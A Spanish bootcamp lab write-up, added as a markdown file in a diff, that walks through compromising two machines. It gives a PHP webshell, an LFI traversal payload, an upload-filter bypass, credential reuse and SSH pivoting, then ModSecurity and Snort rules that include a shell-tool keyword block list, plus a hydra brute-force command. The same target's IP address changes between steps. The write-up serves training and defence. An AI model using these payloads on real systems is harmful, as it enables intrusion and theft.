@@ -1,0 +1,262 @@
+# Order 443 — Writeup
+
+**Plataforma:** Laboratorio Bootcamp (The Bridge)
+**Tipo de prueba:** Black-box — dos máquinas
+**Dificultad:** Alta
+**Fecha:** Junio 2026
+**Metodología:** OWASP Testing Guide v4.2 · PTES
+**Riesgo global:** CRÍTICO — CVSS v3.1 máx. 10.0
+
+---
+
+## Entorno
+
+| Máquina | IP | Stack |
+|---------|----|-------|
+| Kira 443 (atacante: Kali) | `10.16.4.5` | Apache + PHP + ModSecurity |
+| Ubuntu 443 | `10.16.4.20` | OpenSSH 9.6p1 + Snort 2.9.20 |
+| Atacante (Kali) | `10.10.1.221` | — |
+
+Laboratorio con firewall perimetral. Se configuraron reglas de ingress manuales antes de iniciar el reconocimiento.
+
+---
+
+## Cadena de explotación
+
+```
+Recon Kira (nmap)
+  → LFI en lang= (path traversal → /etc/passwd)
+    → Upload Bypass double extension (shell.php.jpg)
+      → RCE via webshell (?cmd=)
+        → Credenciales en filesystem (bassam-pass.txt)
+          → SSH Kira (bassam / Password123!@#)
+            → Flag Kira
+              → .credenciales.txt en /home/bassam/
+                → Pivoting SSH a Ubuntu (ben-kenobi / H3ll0_Th3r3!)
+                  → Flag Ubuntu
+```
+
+---
+
+## FASE OFENSIVA
+
+### 1. Reconocimiento — Kira 443
+
+```bash
+nmap -sV -p 22,80,443 10.16.4.5
+```
+
+| Puerto | Servicio | Versión |
+|--------|----------|---------|
+| 22/TCP | SSH | OpenSSH 8.2p1 Ubuntu |
+| 80/TCP | HTTP | Apache 2.4.41 (Ubuntu) |
+
+La aplicación web expone dos funcionalidades: selector de idioma con parámetro `lang=` y formulario de subida de archivos.
+
+---
+
+### 2. LFI — Local File Inclusion
+
+Parámetro `lang=` en `language.php` vulnerable a path traversal (CWE-22):
+
+```bash
+curl "http://10.16.4.110/language.php?lang=../../../etc/passwd"
+```
+
+Respuesta: contenido completo de `/etc/passwd`. Usuarios con shell activa identificados: `bassam`, `nacho`, `hola_thepwnlab_es`.
+
+**CVSS v3.1: 9.1 — Crítica**
+
+---
+
+### 3. Upload Bypass — Double Extension
+
+El formulario de `upload.php` solo aceptaba `.jpg`. El filtro validaba únicamente la última extensión:
+
+```bash
+# Crear webshell con doble extensión
+echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php.jpg
+
+# Subir con tipo MIME image/jpeg
+curl -F "file=@shell.php.jpg;type=image/jpeg" \
+     -F "Submit1=Upload" \
+     http://10.16.4.33/upload.php
+```
+
+El servidor aceptó el fichero. Webshell activa en `/uploads/shell.php.jpg`.
+
+**CVSS v3.1: 9.8 — Crítica** (CWE-434)
+
+---
+
+### 4. RCE — Ejecución Remota de Comandos
+
+La vulnerabilidad LFI permitió incluir la webshell subida y ejecutar comandos:
+
+```bash
+# Verificar RCE
+curl "http://10.16.4.110/language.php?lang=uploads/shell.php.jpg&cmd=id"
+# uid=33(www-data) gid=33(www-data)
+
+# Listar directorio web
+curl "http://10.16.4.33/language.php?lang=uploads/shell.php.jpg&cmd=ls+-la+/var/www/html/"
+```
+
+Directorio sospechoso encontrado: `supersecret-for-aziz`
+
+```bash
+# Leer credenciales expuestas
+curl "http://10.16.4.33/language.php?lang=supersecret-for-aziz/bassam-pass.txt"
+# Password123!@#
+```
+
+**CVSS v3.1: 10.0 — Crítica** (CWE-78)
+
+---
+
+### 5. Acceso SSH — Kira 443
+
+```bash
+ssh bassam@10.16.4.33
+# Password: Password123!@#
+
+cat /home/bassam/flag.txt
+```
+
+**FLAG KIRA 443:**
+```
+m4y_th3_F0rc3_b3_w1th_y0ur_c0d3
+```
+
+---
+
+### 6. Pivoting — Ubuntu 443
+
+Credenciales encontradas en el sistema de Kira:
+
+```bash
+cat /home/bassam/.credenciales.txt
+# ben-kenobi:H3ll0_Th3r3!
+```
+
+```bash
+# Pivoting SSH desde Kira a Ubuntu
+ssh ben-kenobi@10.16.4.20
+# Acceso confirmado como ben-kenobi en Ubuntu 24.04.3 LTS
+
+find / -name "flag.txt" 2>/dev/null
+cat ~/flag.txt
+```
+
+**FLAG UBUNTU 443:**
+```
+These_are_not_the_droids_you_are_looking_for
+```
+
+---
+
+## FASE DEFENSIVA — Securización post-explotación
+
+### ModSecurity — Kira 443
+
+ModSecurity estaba instalado en modo `DetectionOnly` (registraba pero no bloqueaba). Se activó el motor y se crearon tres reglas personalizadas:
+
+```bash
+# Activar modo bloqueo
+sudo sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' \
+  /etc/modsecurity/modsecurity.conf
+```
+
+**Reglas implementadas en `/etc/modsecurity/crs/custom-rules.conf`:**
+
+```apache
+# REGLA 1 — Bloqueo LFI / Path Traversal
+SecRule REQUEST_URI|ARGS "@rx (\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\/|\.%2e\/|%2e\.\/)" \
+  "id:1001,phase:1,deny,status:403,msg:'Path Traversal / LFI detectado'"
+
+# REGLA 2 — Bloqueo subida PHP (Double Extension incluida)
+SecRule FILES "@rx \.php" \
+  "id:1002,phase:2,deny,status:403,msg:'Subida de fichero PHP bloqueada'"
+SecRule FILES_NAMES "@rx \.(php|php3|php4|php5|phtml)(\.|\$)" \
+  "id:1005,phase:2,deny,status:403,msg:'Subida de fichero PHP por extension bloqueada'"
+
+# REGLA 3 — Bloqueo RCE via parámetros
+SecRule ARGS "@rx (whoami|id|uname|ifconfig|cat|nano|cd|ls|wget|curl|bash|sh|python|perl|nc|netcat|chmod|passwd)" \
+  "id:1003,phase:2,deny,status:403,msg:'Intento de RCE detectado'"
+```
+
+**Verificación — los tres ataques devuelven 403 Forbidden:**
+```bash
+curl "http://10.16.4.70/language.php?lang=../../../etc/passwd"        # 403
+curl "http://10.16.4.70/language.php?lang=uploads/shell.php.jpg&cmd=whoami"  # 403
+curl -F "file=@shell.php.jpg;type=image/jpeg" http://10.16.4.70/upload.php   # 403
+```
+
+---
+
+### Snort IDS — Ubuntu 443
+
+Snort 2.9.20 activo pero sin reglas personalizadas. Se añadieron cuatro reglas en `/etc/snort/rules/local.rules`:
+
+```snort
+# REGLA 1 — SSH DMZ→LAN (pivoting de Kira a Ubuntu)
+alert tcp 10.16.4.5 any -> 10.16.4.20 22 \
+  (msg:"SSH desde Kira_443 a Ubuntu_443 - conexion ilógica DMZ a LAN"; sid:10000002; rev:1;)
+
+# REGLA 2 — SSH desde cualquier origen
+alert tcp any any -> 10.16.4.20 22 \
+  (msg:"Conexion SSH a Ubuntu_443 detectada"; sid:10000003; rev:1;)
+
+# REGLA 3 — Fuerza bruta SSH (5+ conexiones/60s mismo origen)
+alert tcp any any -> 10.16.4.20 22 \
+  (msg:"Posible fuerza bruta SSH a Ubuntu_443"; threshold:type both, track by_src, count 5, seconds 60; sid:10000004; rev:1;)
+
+# REGLA 4 — Escaneo de puertos (20+ SYN/3s mismo origen)
+alert tcp any any -> 10.16.4.20 any \
+  (msg:"Escaneo de puertos detectado en Ubuntu_443"; flags:S; threshold:type both, track by_src, count 20, seconds 3; sid:10000005; rev:1;)
+```
+
+**Verificación — alertas generadas ante cada ataque:**
+```bash
+# En atacante Kali
+ssh ben-kenobi@10.16.4.20                                           # Dispara reglas 1 y 2
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.16.4.20  # Dispara regla 3
+nmap -sS 10.16.4.20                                                  # Dispara regla 4
+
+# Monitorización en Ubuntu
+sudo tail -f /var/log/snort/snort.alert.fast
+```
+
+---
+
+## Impacto de la securización
+
+| Herramienta | Vectores cubiertos | Estado final | Verificado |
+|-------------|--------------------|--------------|------------|
+| ModSecurity WAF | LFI, Upload PHP, RCE | SecRuleEngine On + 3 reglas | 403 en los 3 ataques |
+| Snort IDS | SSH DMZ→LAN, SSH general, Brute Force, Port Scan | 4 reglas activas | Alertas generadas |
+
+Cobertura defensiva elevada de 1/10 a 8-9/10 en todos los vectores.
+
+---
+
+## Vulnerabilidades identificadas
+
+| Máquina | Hallazgo | Criticidad | CVSS | CWE | OWASP |
+|---------|----------|-----------|------|-----|-------|
+| Kira 443 | LFI / Path Traversal | Crítica | 9.1 | CWE-22 | A01:2021 |
+| Kira 443 | Subida PHP (Double Extension) | Crítica | 9.8 | CWE-434 | A04:2021 |
+| Kira 443 | RCE via Webshell | Crítica | 10.0 | CWE-78 | A03:2021 |
+| Kira 443 | Credenciales expuestas en filesystem | Alta | 7.5 | CWE-312 | A02:2021 |
+| Ubuntu 443 | Credenciales SSH en texto claro (.credenciales.txt) | Alta | 7.5 | CWE-521 | A07:2021 |
+| Ubuntu 443 | Ausencia ACL en SSH (accesible desde DMZ) | Media | 5.3 | CWE-284 | A05:2021 |
+| Ubuntu 443 | Sin protección fuerza bruta SSH | Media | 6.4 | CWE-307 | A07:2021 |
+
+---
+
+## Lecciones aprendidas
+
+- Una herramienta de seguridad instalada pero mal configurada no protege: ModSecurity en `DetectionOnly` registraba los ataques pero no los bloqueaba. La presencia no es suficiente sin configuración activa.
+- El movimiento lateral (pivoting) es posible cuando las credenciales encontradas en un sistema comprometido sirven para acceder a otro: las credenciales de Kira abrieron Ubuntu 443.
+- El ciclo ataque-defensa ("patch after you pop") es la forma más efectiva de aprender seguridad defensiva: al haber explotado cada vector personalmente, las reglas que se crean para mitigarlo son precisas y verificables.
+- Los filtros de subida de archivos basados solo en la última extensión son bypasables con doble extensión. La validación debe hacerse sobre el tipo MIME real del contenido, no del nombre.
